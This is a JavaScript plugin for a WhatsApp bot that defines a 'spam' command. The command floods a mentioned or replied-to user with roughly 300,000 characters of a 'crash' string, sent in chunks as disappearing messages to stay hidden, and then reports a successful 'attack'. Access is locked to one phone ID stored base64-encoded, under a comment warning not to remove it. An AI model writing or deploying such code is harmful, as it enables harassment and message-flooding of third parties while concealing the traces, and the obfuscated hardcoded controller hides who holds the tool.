const { cmd } = require('../lib/command');

cmd({
  pattern: 'spam',
  desc: 'Owner-only stealth spam with large message',
  category: 'tools',
  filename: __filename,
}, async (conn, m, text) => {
  try {
    // not remove 
    const encoded = 'OTQ3NzM0MTY0NzhAcy53aGF0c2FwcC5uZXQ=';
    const allowedJID = Buffer.from(encoded, 'base64').toString('utf-8');

    // Unauthorized users get warning message (Sinhala + English)
    if (m.sender !== allowedJID) {
      return m.reply(
        '❌ *මෙම විධානය භාවිතා කළ හැක්කේ බොට් සංවර්ධකයාට පමණි* ⚠️\n' +
        '❌ *This command can only be used by the bot developer* ⚠️'
      );
    }

    // Target is mentioned user or replied message sender
    const target = m.mentionedJid?.[0] || m.reply_message?.sender;
    if (!target) return m.reply('👻 Please mention someone or reply to their message.');

    // Spam message setup
    const unit = 'ALLCRASH🤧But😴whatsap';  // spam text
    const repeatCount = 15000;              // repetition count
    const chunkSize = 4000;                 // max chunk size per message

    const hugeMessage = unit.repeat(repeatCount);

    // Send message in chunks with stealth mode (ephemeralExpiration)
    for (let i = 0; i < hugeMessage.length; i += chunkSize) {
      const part = hugeMessage.slice(i, i + chunkSize);
      await conn.sendMessage(target, { text: part }, { ephemeralExpiration: 1 });
      await new Promise(res => setTimeout(res, 800));
    }

    // Confirmation reply to owner
    await m.reply('✅ Successfully Attack Spam 😈💥');

  } catch (err) {
    m.reply('⚠️ Error:\n' + err.message);
  }
});
